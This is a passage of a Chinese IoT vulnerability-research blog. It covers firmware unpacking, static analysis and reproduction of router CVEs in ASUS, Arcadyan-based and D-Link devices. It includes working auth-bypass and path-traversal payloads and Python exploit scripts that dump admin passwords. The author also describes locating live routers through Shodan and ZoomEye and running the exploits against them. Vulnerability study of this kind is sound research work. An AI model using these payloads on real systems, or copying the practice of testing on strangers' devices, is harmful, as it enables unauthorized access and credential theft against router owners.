class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wget https://down.tenda.com.cn/uploadfile/AC18/ac18_kf_V15.03.05.19\u003cspan class=\"o\"\u003e(\u003c/span\u003e6318_\u003cspan class=\"o\"\u003e)\u003c/span\u003e_cn.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ binwalk -Me ac18_kf_V15.03.05.19\u003cspan class=\"o\"\u003e(\u003c/span\u003e6318_\u003cspan class=\"o\"\u003e)\u003c/span\u003e_cn.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入SaTC容器中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ls /home/satc/SaTC/SaTC_data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e ~/SaTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 测试/bin/httpd是否存在命令注入漏洞\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script\u003cspan class=\"o\"\u003e=\u003c/span\u003eref2sink_cmdi -b httpd --taint_check\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 测试/bin/httpd是否存在缓冲区溢出漏洞\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script\u003cspan class=\"o\"\u003e=\u003c/span\u003eref2sink_bof -b httpd --taint_check\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/NIs4Tolehu6FVn5.png\" alt=\"image-20240225123452035\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e过程中可能会飘红，或者警告，直接忽略，只要在\u003ccode\u003e/home/satc/res\u003c/code\u003e下输出txt文件就ok\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e尝试2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-SH\" data-lang=\"SH\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wget https://down.tenda.com.cn/uploadfile/AC10/V16.03.48.23.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ unzip V16.03.48.23.zip \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e V16.03.48.23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ binwalk -Me US_AC10V5.0si_V16.03.48.23_cn_TDC01.bin \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/bT35JcBd2Sn4gvR.png\" alt=\"image-20240225123547359\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e尝试3\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$wget\u003c/span\u003e https://ftp.dlink.ru/pub/Router/DWR-921/Firmware/2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /home/iot/tools/firmware-analysis-toolkit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./fat.py /home/iot/vul/D-Link/DWR-921/2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/2rAUfnyPv3qkLZa.png\" alt=\"image-20240225121253995\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ binwalk -Me 2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入SaTC容器中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ls /home/satc/SaTC/SaTC_data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e ~/SaTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 测试/bin/httpd是否存在命令注入漏洞\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script\u003cspan class=\"o\"\u003e=\u003c/span\u003eref2sink_cmdi -b httpd --taint_check\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 测试/bin/httpd是否存在缓冲区溢出漏洞\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script\u003cspan class=\"o\"\u003e=\u003c/span\u003eref2sink_bof -b httpd --taint_check\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/8XGEe9RblsIdCcF.png\" alt=\"image-20240225123710408\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e文章后面的部分还在施工中，\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的学习记录吧！\u003c/p\u003e","title":"IoT漏洞挖掘思路"},{"content":"","date":"February 23, 2024","permalink":"/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"Categories","summary":"","title":"IoT学习记录"},{"content":"","date":"February 23, 2024","permalink":"/series/iot%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/","section":"Series","summary":"","title":"IoT学习小记"},{"content":" 如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 漏洞基本信息格式：\n漏洞基本信息 - 漏洞编号： - 漏洞类型： - 漏洞利用效果 - 漏洞披露时间： - 漏洞描述： - 设备型号： - 设备架构： - 复现进度： - 漏洞复现 - 静态分析 - 动态调试 - 受影响的漏洞组件 ： - 文件名： - 功能： - 技术栈：（脚本语言） - 定位漏洞组件的方法和工具： - 污点分析 - 静态分析工具 - 动态调试工具 ASUS(华硕) # CVE-2021-32030 # CVE - CVE-2021-32030 (mitre.org)\nadvisories/ATREDIS-2020-0010.md at master · atredispartners/advisories (github.com)\n漏洞基本信息 # 漏洞编号：CVE-2021-32030 漏洞类型： 身份验证绕过 漏洞利用效果：对管理员界面的未经授权的访问 漏洞披露时间：20210505 漏洞描述： ASUS GT-AC2900管理员应用程序在处理未经身份验证的用户的远程输入时，容易受到身份验证绕过漏洞的攻击，从而导致对管理员界面的未经授权的访问 设备型号：低于 3.0.0.4.386.42643 的 ASUS GT-AC2900 设备 设备架构：ARM 复现进度： 已进行静态分析 受影响的漏洞组件 ： 文件名：httpd 功能：用于处理用户发送的 HTTP 请求 定位漏洞组件的方法和工具： 静态分析工具 ida(32位) ghidra 解包 # 固件下载链接：https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip binwalk 解包之后得到一个 100000.ubi 文件 使用 ubi_reader 继续解包 在 /usr/sbin/ 目录下找到一个叫做 httpd 的程序 此程序用于处理用户发送的 HTTP 请求 $ wget https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip $ unzip FW_RT_AX56U_30043848253.zip $ cd Firmware_Release ### ➜ /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release ls RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w ### $ binwalk -Me RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w ### ➜ /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted ls 100000.ubi ubifs-root ### $ ubireader_extract_files 100000.ubi ### ➜ /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted ls ubifs-root/1589911850/rootfs_ubifs bin cifs2 debug etc jffs mmc opt rom sbin sysroot usr www cifs1 data dev home lib mnt proc root sys tmp var ### ### ➜ /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted/ubifs-root/1589911850/rootfs_ubifs/usr/sbin ls |grep http httpd httpds lighttpd lighttpd-arpping lighttpd-monitor ### $ file httpd ### httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 4.1.0, stripped ### $ checksec httpd ### [*] \u0026#39;httpd\u0026#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) ### 漏洞分析 # 使用 IDA 分析程序 搜索 httpd_handle_request 字符串可找到处理请求的入口位置 httpd_handle_request 函数逻辑简述如下 首先对请求进行简单解析，利用 strncasecmp 等字符串操作函数从用户请求中匹配出一些结构，并将这些数据赋值到对应的变量。\n然后过滤 URL，防止出现路径穿越。\n之后根据用户访问的 URL 和 Method 执行不同逻辑，但所有需要身份验证的接口都要经过函数 auth_check(sub_5B560)，此函数从 Cookie 中获取 asus_token 参数的值，然后带入 sub_59588 进行检查\n我们注意到函数先从配置文件中获取 ifttt_token 参数的值，然后将 asus_token 和它比较，如果两者相等，则输出IFTTT/ALEXA long token success.\n同时返回 1，表示身份验证通过。\n但是在设备的默认配置下，IFTTT 功能没有开启，这导致 ifttt_token 默认值为空，\n此时如果用户传入的 asus_token 也是空值 则 strcmp 会返回 0 表示比较成功 这样就能绕过后续的检查，实现身份验证绕过。 poc：\nGET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1 Host: 192.168.1.107:8443 Content-Length: 0 User-Agent: asusrouter-- Connection: close Referer: https://192.168.1.107:8443/ Cookie: asus_token=\\0Invalid; clickedItem_tab=0 HTTP/1.0 200 OK Server: httpd/2.0 Content-Type: application/json;charset=UTF-8 Connection: close { \u0026#34;get_cfg_clientlist\u0026#34;:[{\u0026#34;alias\u0026#34;:\u0026#34;24:4B:FE:64:37:10\u0026#34;,\u0026#34;model_name\u0026#34;:\u0026#34;GT-AC2900\u0026#34;,\u0026#34;ui_model_name\u0026#34;:\u0026#34;GT-AC2900\u0026#34;,\u0026#34;fwver\u0026#34;:\u0026#34;3.0.0.4.386_41793-gdb31cdc\u0026#34;,\u0026#34;newfwver\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;ip\u0026#34;:\u0026#34;192.168.50.1\u0026#34;,\u0026#34;mac\u0026#34;:\u0026#34;24:4B:FE:64:37:10\u0026#34;,\u0026#34;online\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;ap2g\u0026#34;:\u0026#34;24:4B:FE:64:37:10\u0026#34;,\u0026#34;ap5g\u0026#34;:\u0026#34;24:4B:FE:64:37:14\u0026#34;,\u0026#34;ap5g1\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;apdwb\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;wired_mac\u0026#34;:[ ... ... } 新版 auth_check 函数将代码修改为\nif ( *a1 \u0026amp;\u0026amp; *nvram_safe_get_0(\u0026#34;ifttt_token\u0026#34;) \u0026amp;\u0026amp; (v2 = nvram_safe_get_0(\u0026#34;ifttt_token\u0026#34;), !strcmp(a1, v2)) ) { if ( isFileExist(\u0026#34;/tmp/IFTTT_ALEXA\u0026#34;) \u0026gt; 0 ) Debug2File( \u0026#34;/tmp/IFTTT_ALEXA.log\u0026#34;, \u0026#34;[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\\n\u0026#34;, \u0026#34;check_ifttt_token\u0026#34;, 1020); result = 1; } 首先判断 asus_token 是否为空，避免用户传入空值的情况出现，从而修复了此漏洞。\n漏洞复现 # 由于该设备我们qemu模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接patch，因此，在本地较难复现\n使用 shodan（ https://www.shodan.io/ ） 查找到还在用此路由器设备的站点\n可以复现漏洞，但是这样做不太好（）\nCVE-2021-20090 # 漏洞基本信息 # 漏洞编号：CVE-2021-20090\n漏洞类型： 身份验证绕过\n漏洞利用效果：对管理员界面的未经授权的访问\n漏洞披露时间：20201217\n漏洞描述：\nArcadyan制造的网络设备的Web界面中有一个路径遍历漏洞，可允许未经身份验证的远程攻击者绕过身份验证。 由于根本原因存在于底层 Arcadyan 固件，且有多个厂商采用了 Arcadyan 开发的系统套件，故CVE-2021-20090 影响很多设备 设备型号：\nBuffalo WSR-2533DHPL2 固件版本 \u0026lt;= 1.02 和 WSR-2533DHP3 固件版本 \u0026lt;= 1.24\nVendor Device Found on version ADB ADSL wireless IAD router 1.26S-R-3P Arcadyan ARV7519 00.96.00.96.617ES Arcadyan VRV9517 6.00.17 build04 Arcadyan VGV7519 3.01.116 Arcadyan VRV9518 1.01.00 build44 ASMAX BBR-4MG / SMC7908 ADSL 0.08 ASUS DSL-AC88U (Arc VRV9517) 1.10.05 build502 ASUS DSL-AC87VG (Arc VRV9510) 1.05.18 build305 ASUS DSL-AC3100 1.10.05 build503 ASUS DSL-AC68VG 5.00.08 build272 Beeline Smart Box Flash 1.00.13_beta4 British Telecom WE410443-SA 1.02.12 build02 Buffalo WSR-2533DHPL2 1.02 Buffalo WSR-2533DHP3 1.24 Buffalo BBR-4HG Buffalo BBR-4MG 2.08 Release 0002 Buffalo WSR-3200AX4S 1.1 Buffalo WSR-1166DHP2 1.15 Buffalo WXR-5700AX7S 1.11 Deutsche Telekom Speedport Smart 3 010137.4.8.001.0 HughesNet HT2000W 0.10.10 KPN ExperiaBox V10A (Arcadyan VRV9517) 5.00.48 build453 KPN VGV7519 3.01.116 O2 HomeBox 6441 1.01.36 Orange LiveBox Fibra (PRV3399) 00.96.00.96.617ES Skinny Smart Modem (Arcadyan VRV9517) 6.00.16 build01 SparkNZ Smart Modem (Arcadyan VRV9517) 6.00.17 build04 Telecom (Argentina) Arcadyan VRV9518VAC23-A-OS-AM 1.01.00 build44 TelMex PRV33AC 1.31.005.0012 TelMex VRV7006 Telstra Smart Modem Gen 2 (LH1000) 0.13.01r Telus WiFi Hub (PRV65B444A-S-TS) v3.00.20 Telus NH20A 1.00.10debug build06 Verizon Fios G3100 2.0.0.6 Vodafone EasyBox 904 4.16 Vodafone EasyBox 903 30.05.714 Vodafone EasyBox 802 20.02.226 设备架构：ARM\n复现进度：\n已成功复现 已进行静态分析 受影响的漏洞组件 ：\n文件名：httpd 功能：用于处理用户发送的 HTTP 请求 定位漏洞组件的方法和工具：\n静态分析工具 ida(32位) ghidra 解包 # $ wget wget https://dlcdnets.asus.com/pub/ASUS/wireless/DSL-AC88U/FW_DSL_AC88U_11005502.zip $ unzip FW_DSL_AC88U_11005502.zip $ binwalk -Me DSL-AC88U_v1.10.05_build502.w $ cd _DSL-AC88U_v1.10.05_build502.w.extracted $ ubireader_extract_files 2C0000.ubi $ ls ./ubifs-root/0/rootfs_ubifs ### bin bootfs data dev etc lib mnt opt proc ramdisk rom sbin sys tmp usr var www ### $ file httpd ### httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped ### $ checksec httpd ### [*] \u0026#39;httpd\u0026#39; Arch: arm-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8000) RWX: Has RWX segments ### 漏洞分析 # 根据Juniper威胁实验室发现的在野漏洞利用细节，发现攻击者在url中通过..%2f来遍历访问/images上层路径中的文件，疑似路径遍历漏洞\n使用IDA加载httpd程序，字符串窗口搜索/images\n发现在sub_DEB0函数中使用了该字符串\n分析sub_DEB0函数的功能\n大致是通过遍历数组，判断数组中是否存在某个元素是传入参数的子串 （此处strncasecmp函数是根据数据元素的长度来进行比较的） 存在则返回1，否则返回0 猜测传入的参数大概率是请求路径，而字符串/images/恰恰是数组的第一个元素，分析数组中元素的字面意思，推断都是在无需登录情况下就可以访问的路径或文件（在未登录的情况下应该也能访问一些图片、htm等文件） 继续查看sub_DEB0函数的交叉引用，发现如下逻辑关系\n当sub_DEB0函数返回1时，a1+30376地址处的内容被修改为1\na1+30376地址地址处内容与另一个函数sub_1D578的返回值存在‘或’的判断， 如果a1+30376地址处内容为1， 那么函数sub_1D578的返回值无论是什么，结果都为真\n查看函数sub_1D578，在该函数中发现了对SID值的校验。并且在对路由器登录抓包过程中发现，当登录成功后，请求其他文件时，会携带一个cookie值，而cookie中就存在SID这个变量。\nsub_1D578函数中调用的sub_1D0C0函数的部分伪代码\nsub_1D0C0函数中调用的sub_1CE8C函数的部分伪代码\n所以只需要保证sub_DEB0返回值==1即可绕过cookie SID的校验。\n而满足sub_DEB0() == 1只需要路径包含指定路径即可，如上图中的/images/、/lang/、/js/、/css/等。\n但是，上述指定路径限制了我们访问敏感API或敏感页面。此时，结合路径穿越漏洞，可解除指定路径的限制，实现未登录状态下对任意api/url的合法访问。\n再看一下搜索一下字符串，可以看到sub_14C30函数有一个\u0026quot;process_post\u0026quot;字符串\n发现sub_14C30函数将url放入sub_DF50函数进行处理\n而sub_DF50函数又会将url传入sub_167A8函数\nsub_167A8函数里存在一个可以与之前漏洞结合起来使用的漏洞点：会跳过特定内容将后续的东西拷贝到前面，从而更换url的内容\n即这个函数会把/api/../test给转换成/test\n结合先前的内容，将url前放入预定义的数据，后面接上/../xxx，就不需要认证即可访问xxx，造成认证绕过漏洞。\n例如：/images/../apply_abstract.cgi\n程序先匹配到 /images，绕过登录，然后替换 /../ 导致后续访问的是 /apply_abstract.cgi 接口，实现身份验证绕过\n漏洞复现 # 由于该设备我们qemu模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接patch，因此，在本地较难复现\n使用 shodan（ https://www.shodan.io/search?query=tew-751dr ） 查找到还在用表格中路由器设备的站点\n使用zoomeye（https://www.zoomeye.org/discover）来查找也可以\n部分还在用表格中型号路由器设备的站点，可能因为已经升级为了新固件版本，所以poc没有打通\n经过几次尝试，访问http://某ip/images/../apply_abstract.cgi时\n会直接跳转到http://某ip/apply_abstract.cgi\n然后弹出身份验证提示\n点击取消之后可以发现已经开始下载apply_abstract.cgi文件了\n漏洞复现成功\n可以复现漏洞，但是这样做不太好（）\nD-Link(友讯) # D-link的以往固件可以在下列网站上找到：\nD-Link | Technical Support | Downloads (dlink.com.tw)\nIndex of /pub/Router (dlink.ru)\nCVE-2017-12943 # 漏洞基本信息 # 漏洞编号：CVE-2017-12943 漏洞类型： 绝对路径遍历攻击 漏洞利用效果：通过绝对路径遍历来读取密码信息 漏洞披露时间：20170818 漏洞描述： 带有 v2.x 固件的 D-Link DIR-600 Rev Bx 设备允许远程攻击者通过型号/__show_info.php读取密码？REQUIRE_FILE= 绝对路径遍历攻击 设备型号：D-Link DIR-600 Rev Bx 设备架构： 复现进度： 已进行静态分析 受影响的漏洞组件 ： 文件名：httpd 功能：用于处理用户发送的 HTTP 请求 定位漏洞组件的方法和工具： 静态分析工具 ida(32位) ghidra 解包 # Index of /pub/Router (dlink.ru)\n# 安装sasquatch $ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev $ git clone https://github.com/devttys0/sasquatch $ cd sasquatch \u0026amp;\u0026amp; ./build.sh # binwalk： $ sudo apt-get install build-essential autoconf $ git python-lzma python-crypto libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip $sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools $ sudo pip install pyqtgraph capstone # 解决 No module named pkg_resources 的问题 $ sudo apt-get install --reinstall python-pkg-resources $ wget http://files.dlink.com.au/products/DIR-600/REV_B1/Firmware/Firmware_v2.05/DIR600B_FW205b01.bin # $ wget https://github.com/d4rk30/CVE-2017-12943/blob/master/FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin $ sudo binwalk -Me DIR600B_FW205b01.bin # $ sudo binwalk -Me FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin $ ls ./etc/templates/httpd/ 漏洞分析 # # 在_DIR600B_FW205b01.bin.extracted/squashfs-root/www/model 可以看到_show_info.php文件 $ cd /home/iot/vul/D-Link/CVE-2017-12943/_DIR600B_FW205b01.bin.extracted/squashfs-root/www/model $ code _show_info.php 可以看到在第 17 行，存在一个路径拼接的问题\n其中 require 是引入文件的函数，直接访问当前页面，前面的变量 $LOCATE_PATH 在当前页面没有引入，所以默认是空\n所以我们可以构造paylaod来通过绝对路径遍历读取文件\n同时我们可以看到在 /etc/templates/httpd 下面有一个 httpasswd.php 输出的是用户名密码\n$ cd /home/iot/vul/D-Link/CVE-2017-12943/_DIR600B_FW205b01.bin.extracted/squashfs-root/etc/templates/httpd $ code httpasswd.php 所以我们就可以构造payload直接访问这个页面来获得账号密码\n# paylaod: localhost/model/__show_info.php?REQUIRE_FILE=%2Fetc%2Ftemplates%2Fhttpd%2Fhttpasswd.php 漏洞复现 # # firmware-analysis-toolkit $ ./fat.py /home/iot/vul/D-Link/CVE-2017-12943/DIR600B_FW205b01.bin # firmAE $ sudo ./run.sh -r dir600 /home/iot/vul/D-Link/CVE-2017-12943/FIRMWARE_DIR600B1_B2_v2.01-tomizone-1.1.0.bin fat仿真失败了，不过firmAE成功了，所以接下来进行本地漏洞复现\n手动测试漏洞：\n直接输入192.168.0.1/model/__show_info.php?REQUIRE_FILE=%2Fetc%2Ftemplates%2Fhttpd%2Fhttpasswd.php\n获得账号密码\n成功登入：\n也可以使用exp来复现漏洞：\n# localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd import requests url = \u0026#34;http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=./etc/templates/httpd/httpasswd.php\u0026#34; r = requests.get(url) print (r.text) print (r.json) DIR320 # 复现过程及漏洞原理与CVE-2017-12943类似\n$ wget https://ftp.dlink.ru/pub/Router/DIR-320/Firmware/old/DIR-320A1_FW121WWb03.bin # 提取固件 binwalk -Me DIR-320A1_FW121WWb03.bin # 仿真 $ sudo ./init.sh ### [sudo] password for ubuntu: + sudo service postgresql restart + echo \u0026#39;Waiting for DB to start...\u0026#39; Waiting for DB to start... + sleep 5 ### $ sudo ./run.sh -r dir320 /home/iot/vul/D-Link/CVE-2017-12943/DIR-320A1_FW121WWb03.bin # payload: localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd # 直接转到： http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd DIR645 # 复现过程及漏洞原理与CVE-2017-12943类似\n$ sudo ./run.sh -r dir645 /home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin $ sudo ./run.sh -r dir645 ./home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin /home/iot/vul/D-Link/CVE-2017-12943/DIR645A1_FW102B08.bin emulation start!!! extract done!!! get architecture done!!! mke2fs 1.44.1 (24-Mar-2018) e2fsck 1.44.1 (24-Mar-2018) # payload: # http://192.168.0.1/getcfg.php # post:SERVICES=DEVICE.ACCOUNT $ curl -d \u0026#34;SERVICES=DEVICE.ACCOUNT\u0026#34; \u0026#34;http://192.168.0.1/getcfg.php\u0026#34; exp：\nimport requests url = \u0026#34;http://192.168.0.1/getcfg.php\u0026#34; #payload = \u0026#34;SERVICES=DEVICE.ACCOUNT\u0026#34; payload = {\u0026#34;SERVICES\u0026#34;: \u0026#34;DEVICE.ACCOUNT\u0026#34;} data = payload #data = data.encode(\u0026#34;utf-8\u0026#34;) r = requests.post(url, data) print (r) print (r.text) ➜ /home/iot python3 exp.py 192.168.0.1 \u0026lt;Response [200]\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;postxml\u0026gt; \u0026lt;module\u0026gt; \u0026lt;service\u0026gt;DEVICE.ACCOUNT\u0026lt;/service\u0026gt; \u0026lt;device\u0026gt; \u0026lt;gw_name\u0026gt;DIR-645\u0026lt;/gw_name\u0026gt; \u0026lt;account\u0026gt; \u0026lt;seqno\u0026gt;2\u0026lt;/seqno\u0026gt; \u0026lt;max\u0026gt;2\u0026lt;/max\u0026gt; \u0026lt;count\u0026gt;2\u0026lt;/count\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;uid\u0026gt;USR-\u0026lt;/uid\u0026gt; \u0026lt;name\u0026gt;admin\u0026lt;/name\u0026gt; \u0026lt;usrid\u0026gt;\u0026lt;/usrid\u0026gt; \u0026lt;password\u0026gt;adminhello\u0026lt;/password\u0026gt; \u0026lt;group\u0026gt;0\u0026lt;/group\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;uid\u0026gt;USR-1\u0026lt;/uid\u0026gt; \u0026lt;name\u0026gt;user\u0026lt;/name\u0026gt; \u0026lt;usrid\u0026gt;\u0026lt;/usrid\u0026gt; \u0026lt;password\u0026gt;userhello\u0026lt;/password\u0026gt; \u0026lt;group\u0026gt;101\u0026lt;/group\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/account\u0026gt; \u0026lt;group\u0026gt; \u0026lt;seqno\u0026gt;\u0026lt;/seqno\u0026gt; \u0026lt;max\u0026gt;\u0026lt;/max\u0026gt; \u0026lt;count\u0026gt;0\u0026lt;/count\u0026gt; \u0026lt;/group\u0026gt; \u0026lt;session\u0026gt; \u0026lt;captcha\u0026gt;0\u0026lt;/captcha\u0026gt; \u0026lt;dummy\u0026gt;\u0026lt;/dummy\u0026gt; \u0026lt;timeout\u0026gt;600\u0026lt;/timeout\u0026gt; \u0026lt;maxsession\u0026gt;128\u0026lt;/maxsession\u0026gt; \u0026lt;maxauthorized\u0026gt;16\u0026lt;/maxauthorized\u0026gt; \u0026lt;/session\u0026gt; 